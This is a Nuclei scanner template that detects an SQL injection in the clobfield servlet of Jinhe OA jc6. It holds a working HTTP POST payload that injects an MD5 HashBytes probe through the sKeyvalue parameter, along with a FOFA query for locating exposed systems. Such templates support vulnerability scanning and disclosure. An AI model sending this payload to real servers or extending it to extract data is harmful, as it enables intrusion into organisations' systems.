http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '{{md5(num)}}'
    - nvarchar
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /jc6/servlet/clobfield HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11''
    and CONVERT(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{num}}%27))))=1
    and ''''=''

    '
id: jinhe-jc6-sqli
info:
  author: Ky9oss
  description: 'SQL injection vulnerability in the ljc6/servlet/clobfield interface
    of Jinhe OA jc6. An attacker can obtain sensitive information.

    '
  metadata:
    fofa-query: "title=\"\u91D1\u548C\u534F\u540C\u7BA1\u7406\u5E73\u53F0\""
    max-request: 1
    verified: true
  name: Jinhe OA - SQL Injection
  reference:
  - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA%20jc6%20clobfield%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  - https://blog.csdn.net/qq_41904294/article/details/135074649
  severity: high
  tags: jinher,jc6,sqli
variables:
  num: '{{rand_int(9000000, 9999999)}}'
